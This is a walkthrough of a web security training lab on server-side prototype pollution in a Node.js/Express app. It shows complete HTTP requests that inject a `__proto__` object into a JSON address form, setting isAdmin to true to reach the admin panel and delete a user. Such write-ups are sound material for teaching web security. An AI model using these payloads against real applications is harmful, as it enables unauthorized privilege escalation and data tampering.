## Privilege escalation via server-side prototype pollution

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.

To solve the lab:

1. Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user carlos.

You can log in to your own account with the following credentials: wiener:peter

Note :

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Notes

- /admin
- /login
- Billing and Delivery form

## Resume

1. Log in as `wiener:peter`.
2. Submit the address form once to capture the JSON request.
3. Test prototype pollution with a harmless property.
4. Verify that the injected property appears in the response via inheritance.
5. Pollute `isAdmin` to `true`.
6. Refresh the account page, open the admin panel, and delete `carlos`.

## Solve

First, log in with the provided credentials and visit your account page. Submit the address form so the application sends the data as JSON. The request you want to study is:

```http
POST /my-account/change-address HTTP/2
Host: 0af2000a03d5c6ba80ac5dc5007700ac.web-security-academy.net
Cookie: session=MIdYF73AomBVczxft5mPj06MRZiXWqPH
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"MIdYF73AomBVczxft5mPj06MRZiXWqPH"
}
```

The important part is that the server accepts JSON and then returns a JSON object in the response. That means the backend is likely merging the request body into a user object, which is exactly the kind of behavior that can lead to server-side prototype pollution.

Send the request to Repeater and add a `__proto__` property with a harmless key first:

```http
POST /my-account/change-address HTTP/2
Host: 0af2000a03d5c6ba80ac5dc5007700ac.web-security-academy.net
Cookie: session=MIdYF73AomBVczxft5mPj06MRZiXWqPH
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"MIdYF73AomBVczxft5mPj06MRZiXWqPH",
  "__proto__": {
    "foo":"bar"
  }
}
```

If the response now contains `foo: bar` even though `__proto__` itself is not reflected, that is strong evidence that the object inherited the property through the prototype chain.

Look at the properties in the JSON response and notice the `isAdmin` field. It is normally set to `false`, which is a perfect gadget because the application likely uses it to decide whether to show the admin panel. If you can make the backend inherit `isAdmin: true`, you can escalate privileges without changing your account in the database.

Replace the harmless polluted property with the authorization flag:

```http
POST /my-account/change-address HTTP/2
Host: 0af2000a03d5c6ba80ac5dc5007700ac.web-security-academy.net
Cookie: session=MIdYF73AomBVczxft5mPj06MRZiXWqPH
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"MIdYF73AomBVczxft5mPj06MRZiXWqPH",
  "__proto__": {
    "isAdmin": true
  }
}
```

After sending the polluted request, refresh the account page in the browser. You should now see a link to the admin panel because the application believes your user is an admin. Go to `/admin`, delete `carlos`, and the lab is solved.
